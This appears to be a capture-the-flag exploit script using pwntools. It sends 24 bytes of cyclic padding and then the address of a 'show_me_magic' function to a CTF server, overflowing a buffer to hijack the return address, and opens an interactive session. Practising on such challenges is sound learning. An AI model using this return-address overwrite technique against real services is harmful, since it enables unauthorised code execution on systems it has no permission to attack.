from pwn import *
import struct

# print(cyclic(100))

ip = 'ctf.adl.tw'
port = 11001

r = remote(ip, port)
show_me_magic = 0x0000000000400627

payload = "aaaabaaacaaadaaaeaaafaaa"
payload += p64(show_me_magic)

r.sendline(payload)
r.interactive()

